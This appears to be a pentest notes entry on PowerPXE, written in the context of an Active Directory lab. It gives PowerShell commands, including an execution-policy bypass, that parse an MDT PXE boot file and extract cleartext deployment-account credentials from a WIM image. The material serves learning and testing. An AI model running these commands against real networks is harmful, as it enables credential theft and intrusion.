# PowerPXE

PowerShell script for extracting configuration and credentials from Microsoft Deployment Toolkit (MDT) PXE boot images (`.bcd` and `.wim` files). 
Repository: [wavestone-cdt/powerpxe](https://github.com/wavestone-cdt/powerpxe)

## Commands Used

### Parse a BCD file to find the WIM image path
```powershell
powershell -executionpolicy bypass
Import-Module .\PowerPXE.ps1
$BCDFile = "conf.bcd"
Get-WimFile -bcdFile $BCDFile
```
Used on: **Breaching-Active-Directory**

Identified the path `\Boot\x64\Images\LiteTouchPE_x64.wim` from the downloaded `conf.bcd` file.

### Extract credentials from a WIM image
```powershell
Get-FindCredentials -WimFile pxeboot.wim
```
Used on: **Breaching-Active-Directory**

Searches for `bootstrap.ini` inside the `.wim` file and prints the cleartext `UserID` and `UserPassword` used for the MDT deployment account.
